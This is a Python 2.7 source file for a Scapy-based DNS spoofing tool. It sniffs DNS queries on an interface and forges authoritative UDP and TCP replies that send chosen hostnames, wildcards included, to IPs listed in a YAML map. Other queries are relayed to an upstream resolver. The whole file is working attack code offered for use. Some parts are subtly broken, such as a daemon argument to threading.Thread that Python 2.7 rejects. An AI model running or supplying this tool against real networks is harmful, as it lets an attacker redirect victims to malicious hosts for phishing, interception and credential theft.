#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
# Fully-fledged DNS spoof / relay tool (Python-2.7 edition)
#

from __future__ import print_function, absolute_import
import argparse
import ipaddress          # pip2 install ipaddress
import logging
import signal
import socket
import sys
import threading
import time
import yaml               # pip2 install pyyaml

# Scapy 2.4.5 still supports Python 2.7
from scapy.all import (
    DNS, DNSQR, DNSRR,
    IP, IPv6,
    UDP, TCP,
    send, sniff,
)

###############################################################################
# Helper functions
###############################################################################

def setup_logging(verbose, quiet):
    """Configure root logger according to CLI flags (Py-2 safe)."""
    if verbose and quiet:
        quiet = False
    level = logging.DEBUG if verbose else (logging.ERROR if quiet else logging.INFO)
    logging.basicConfig(
        level=level,
        format='%(asctime)s %(levelname)s: %(message)s',
        datefmt='%H:%M:%S',
    )

###############################################################################
# Core spoofer thread
###############################################################################

def _normalise_qname(name):
    return name.rstrip('.').lower()

class DNSSpoofer(threading.Thread):
    """Active DNS spoofing / relay worker (UDP + TCP)."""

    def __init__(self, iface, mapping,
                 upstream='8.8.8.8', relay=False,
                 ttl=300, bpf=None):
        threading.Thread.__init__(self)
        self.daemon = True
        self.iface     = iface
        self.mapping   = mapping            # dict(host→ip or list)
        self.upstream  = upstream
        self.relay     = relay
        self.ttl       = ttl
        self.bpf       = bpf or 'udp or tcp port 53'

        self._running  = threading.Event()
        self._running.set()
        self._tcp_thr  = None               # second thread for TCP queries

    # ------------------------------------------------------------------
    # Mapping helpers
    # ------------------------------------------------------------------
    def _lookup(self, qname):
        """Return list[str] or None."""
        qname = _normalise_qname(qname)

        # exact
        if qname in self.mapping:
            val = self.mapping[qname]
            return val if isinstance(val, list) else [val]

        # wildcard (“*.example.com”)
        for pattern, val in self.mapping.iteritems():
            if pattern.startswith('*.') and qname.endswith(pattern[2:]):
                return val if isinstance(val, list) else [val]
        return None

    # ------------------------------------------------------------------
    # Packet forging helpers
    # ------------------------------------------------------------------
    def _build_answers(self, qname, ips, qtype):
        rr_list = [DNSRR(rrname=qname, type=qtype, ttl=self.ttl, rdata=ip)
                   for ip in ips]
        answers = rr_list[0]
        for extra in rr_list[1:]:
            answers /= extra
        return answers

    def _forge_response(self, pkt, spoof_ips):
        proto = UDP if UDP in pkt else TCP
        q     = pkt[DNSQR]

        dns_resp = DNS(
            id=pkt[DNS].id, qr=1, aa=1, qd=q,
            ancount=len(spoof_ips),
            an=self._build_answers(q.qname, spoof_ips, q.qtype),
        )

        if IP in pkt:
            ip_hdr = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        else:
            ip_hdr = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)

        if proto is UDP:
            udp_hdr = UDP(sport=53, dport=pkt[UDP].sport)
            return ip_hdr / udp_hdr / dns_resp
        else:
            tcp_hdr = TCP(
                sport=53, dport=pkt[TCP].sport,
                flags='PA',
                seq=pkt[TCP].ack,
                ack=pkt[TCP].seq + len(pkt[TCP].payload),
            )
            return ip_hdr / tcp_hdr / dns_resp

    # ------------------------------------------------------------------
    # Packet processors
    # ------------------------------------------------------------------
    def _process_udp(self, pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return
        qname = pkt[DNSQR].qname.decode()
        ips   = self._lookup(qname)
        if ips:
            send(self._forge_response(pkt, ips), iface=self.iface, verbose=False)
            logging.info('Spoofed %s → %s', qname, ', '.join(ips))
        elif self.relay:
            self._relay_upstream(pkt)

    def _process_tcp(self, pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):
            return
        qname = pkt[DNSQR].qname.decode()
        ips   = self._lookup(qname)
        if ips:
            send(self._forge_response(pkt, ips), iface=self.iface, verbose=False)
            logging.info('(TCP) Spoofed %s → %s', qname, ', '.join(ips))
        elif self.relay:
            self._relay_upstream(pkt)       # TCP query → UDP upstream

    # ------------------------------------------------------------------
    # Upstream relay (UDP-only, IPv4)
    # ------------------------------------------------------------------
    def _relay_upstream(self, pkt):
        qname = pkt[DNSQR].qname.decode()
        sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        try:
            sock.sendto(bytes(pkt[DNS]), (self.upstream, 53))
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            logging.warning('Upstream DNS timeout for %s', qname)
            return
        finally:
            sock.close()

        ip_hdr  = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp_hdr = UDP(sport=53, dport=pkt[UDP].sport)
        send(ip_hdr / udp_hdr / DNS(data), iface=self.iface, verbose=False)
        logging.debug('Relayed %s', qname)

    # ------------------------------------------------------------------
    # Thread entry point
    # ------------------------------------------------------------------
    def run(self):
        logging.info('DNS spoofing active on %s (relay=%s) – filter: "%s"',
                     self.iface, self.relay, self.bpf)

        # TCP sniffer in its own thread
        self._tcp_thr = threading.Thread(
            target=lambda: sniff(iface=self.iface,
                                 filter='tcp and (%s)' % self.bpf,
                                 prn=self._process_tcp,
                                 store=0,
                                 stop_filter=lambda _: not self._running.is_set()),
            daemon=True)
        self._tcp_thr.start()

        # UDP sniffer (this thread)
        sniff(iface=self.iface,
              filter='udp and (%s)' % self.bpf,
              prn=self._process_udp,
              store=0,
              stop_filter=lambda _: not self._running.is_set())

    def stop(self):
        self._running.clear()
        if self._tcp_thr and self._tcp_thr.is_alive():
            self._tcp_thr.join(1)

###############################################################################
# YAML mapping loader – accepts str OR list[str]
###############################################################################

def load_mapping(path):
    raw = yaml.safe_load(open(path, 'rb'))
    if not isinstance(raw, dict):
        raise ValueError('Mapping file must contain a YAML dictionary')

    mapping = {}
    for hostname, value in raw.iteritems():
        hostname_norm = _normalise_qname(str(hostname))
        ips = value if isinstance(value, list) else [value]

        good = []
        for ip in ips:
            try:
                ipaddress.ip_address(unicode(ip))
                good.append(str(ip))
            except ValueError:
                logging.warning('Ignoring invalid IP "%s" for host "%s"',
                                ip, hostname_norm)
        if good:
            mapping[hostname_norm] = good if len(good) > 1 else good[0]
    return mapping

###############################################################################
# CLI / entry point
###############################################################################

def main():
    parser = argparse.ArgumentParser(
        description='Fully-fledged DNS spoofing / relay tool (Scapy, Py-2.7)')
    parser.add_argument('-i', '--iface', required=True, help='Interface')
    parser.add_argument('-m', '--map', required=True, help='YAML mapping file')
    parser.add_argument('--relay', action='store_true',
                        help='Relay unmatched queries upstream')
    parser.add_argument('--upstream', default='8.8.8.8',
                        help='Upstream DNS server')
    parser.add_argument('--ttl', type=int, default=300,
                        help='TTL for forged answers')

    grp = parser.add_mutually_exclusive_group()
    grp.add_argument('-q', '--quiet', action='store_true')
    grp.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('--bpf', help='Extra BPF filter (AND)')

    args = parser.parse_args()
    setup_logging(args.verbose, args.quiet)

    try:
        mapping = load_mapping(args.map)
    except ValueError as exc:
        logging.error('%s', exc)
        sys.exit(1)

    if not mapping:
        logging.error('No valid mappings – aborting')
        sys.exit(1)

    spoofer = DNSSpoofer(args.iface, mapping,
                         upstream=args.upstream,
                         relay=args.relay,
                         ttl=args.ttl,
                         bpf=args.bpf)
    spoofer.start()

    def _sigint(_sig, _frame):
        logging.info('Ctrl-C received, shutting down…')
        spoofer.stop()

    signal.signal(signal.SIGINT, _sigint)

    while spoofer.is_alive():
        time.sleep(0.3)

    logging.info('Bye!')

if __name__ == '__main__':
    main()
